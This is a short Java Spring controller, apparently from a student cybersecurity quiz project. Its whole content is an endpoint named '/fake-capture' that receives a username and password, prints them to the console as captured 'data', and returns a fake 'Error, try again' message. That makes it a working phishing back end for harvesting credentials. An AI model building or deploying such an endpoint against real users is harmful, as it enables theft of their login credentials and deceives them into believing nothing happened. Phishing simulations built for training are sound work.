package cybersec.project.quizapp.controllers;

import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class Controller {

    @PostMapping("/fake-capture")
    @ResponseBody
    public String capture(@RequestParam String username,
                          @RequestParam String password) {

        System.out.println("ДАННЫЕ:");
        System.out.println("username = " + username);
        System.out.println("password = " + password);

        return "Error, try again";
    }
}
